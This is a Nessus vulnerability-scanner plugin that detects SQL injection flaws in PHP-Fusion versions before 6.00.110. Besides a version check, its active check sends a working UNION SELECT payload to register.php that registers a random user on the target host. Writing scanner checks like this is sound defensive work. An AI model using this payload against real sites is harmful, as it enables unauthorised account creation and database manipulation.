#
# Josh Zlatin-Amishav (josh at ramat dot cc)
# GPLv2
#

include("compat.inc");

if (description) {
  script_id(20009);
  script_version("$Revision: 1.15 $");
 script_cvs_date("$Date: 2016/11/02 14:37:08 $");

  script_cve_id(
    "CVE-2005-3157",
    "CVE-2005-3158",
    "CVE-2005-3160",
    "CVE-2005-3161"
 );
  script_bugtraq_id(
    14964,
    14992,
    15005,
    15018
 );
  script_osvdb_id(
    19718,
    19722,
    19841,
    19866,
    19867
 );

  script_name(english:"PHP-Fusion < 6.00.110 Multiple Scripts SQL Injection");
  script_summary(english:"Checks for SQL injection in PHP-Fusion's register.php");

 script_set_attribute(attribute:"synopsis", value:
"The remote host contains several PHP scripts that are vulnerable to
SQL injection flaws.");
 script_set_attribute(attribute:"description", value:
"The remote version of this software is vulnerable to multiple SQL
injection attacks due to its failure to properly sanitize certain
parameters.  Provided PHP's 'magic_quotes_gpc' setting is disabled,
these flaws allow an attacker to manipulate database queries, which
may result in the disclosure or modification of data.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2005/Oct/51");
 script_set_attribute(attribute:"see_also", value:"http://secunia.com/secunia_research/2005-52/advisory");
 script_set_attribute(attribute:"solution", value:
"Update to at least version 6.00.110 of PHP-Fusion.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value:"2005/10/12");
 script_set_attribute(attribute:"vuln_publication_date", value:"2005/07/28");
 script_set_attribute(attribute:"patch_publication_date", value:"2005/10/05");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:php_fusion:php_fusion");
 script_end_attributes();

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"(C) 2005-2016 Josh Zlatin-Amishav");

  script_dependencies("php_fusion_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/php_fusion");
  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item_or_exit(string("www/", port, "/php_fusion"));
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  if (!safe_checks()) {
    # Make sure 'register.php' exists -- it's used in the exploit.
    req = http_get(item:string(dir, "/register.php"), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # If it does...
    if ("<form name='inputform' method='post' action='register.php'" >< res) {
      # Try to exploit the flaw to register a user.
      user = rand_str(charset:"abcdefghijklmnopqrstuvwxyz0123456789_");
      pass = rand_str();
      email = string(user, "@", get_host_name());
      sploit = string(
        "UNION SELECT ",
          '"",',
          '"",',
          '0,',
          "'a:4:{",
            's:9:"user_name";s:', strlen(user), ':"', user, '";',
            's:13:"user_password";s:', strlen(pass), ':"', pass, '";',
            's:10:"user_email";s:', strlen(email), ':"', email, '";',
            's:15:"user_hide_email";s:1:"1";',
          "}"
      );
      #
      # nb: the code sanitizes GETs so we can't use that.
      postdata = string("activate=", rand_str(), "'+", urlencode(str:sploit));
      req = string(
        "POST ", dir, "/register.php?plugin=", SCRIPT_NAME, " HTTP/1.1\r\n",
        "Host: ", get_host_name(), "\r\n",
        "Content-Type: application/x-www-form-urlencoded\r\n",
        "Content-Length: ", strlen(postdata), "\r\n",
        "\r\n",
        postdata
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      if ( "Your account has been verified." >< res)
      {
        if (report_verbosity > 0) {
          report = string(
            "\n",
            "Nessus has successfully exploited one of the flaws by adding\n",
            "the user '", user, "' to PHP-Fusion on the remote host.\n"
          );
          security_warning(port:port, extra:report);
        }
        else
          security_warning(port:port);

	set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
        exit(0);
      }
    }
  }

  # Check the version number in case registrations are disabled or safe checks are enabled.
  if (ver =~ "^([0-5][.,]|6[.,]00[.,](0|10[0-9]))") {
    report =
"***** Nessus has determined the vulnerability exists on the remote
***** host simply by looking at the version number of PHP-Fusion
***** installed there.";
    security_warning(port:port, extra:report);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
  }
}
